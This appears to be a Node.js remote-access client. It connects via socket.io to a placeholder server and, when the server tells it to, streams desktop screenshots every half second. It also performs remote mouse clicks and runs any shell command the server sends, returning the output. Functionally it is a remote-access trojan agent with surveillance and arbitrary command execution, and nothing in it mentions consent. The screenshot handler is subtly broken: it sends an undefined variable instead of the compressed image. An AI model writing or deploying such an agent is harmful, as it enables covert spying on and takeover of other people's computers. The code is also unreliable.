const io = require('socket.io-client');
const screenshot = require("screenshot-desktop");
const { exec } = require('child_process');
const { mouse, Button, Point } = require('@nut-tree-fork/nut-js');
const sharp = require('sharp');

const peer = io('https://example.invalid');

let interval_id = 0;

peer.on('connect', () => {
    console.log('Connected to server, My peer ID:', peer.id);
});

peer.on("capture_on", () => {
    console.log("Screen sharing started");
    interval_id = setInterval(async () => {
        const img = await screenshot({ format: 'jpg' });
        const compressed = await sharp(img)
        .jpeg({ quality: 50 })
        .resize({ width: 1920, height: 1080 })
        .toBuffer();

        peer.emit('screenshot', otherBuffer.toString('base64'));
    }, 500);
});

peer.on("capture_off", () => {
    console.log("Screen sharing stopped");
    clearInterval(interval_id);
});

peer.on("click", async (packet) => {
    const { x, y } = packet;
    const position = await mouse.getPosition();
    await mouse.setPosition(new Point(x, y));
    await mouse.click(Button.LEFT);
    await mouse.setPosition(position)
});

// Receive response from server
peer.on('task', (packet) => {
    console.log('Received message from server:', packet);
    exec(packet.command, (error, stdout, stderr) => {
        if (error) {
            console.error('Error executing command:', error);
            peer.emit('reply', { id: peer.id, success: false, packet: JSON.stringify(error), key: packet.key });
        } else {
            console.log('Command output:', stdout);
            peer.emit('reply', { id: peer.id, success: true, packet: stdout, key: packet.key });
        }
    });
});

peer.on('disconnect', () => {
    console.log('Disconnected from server');
});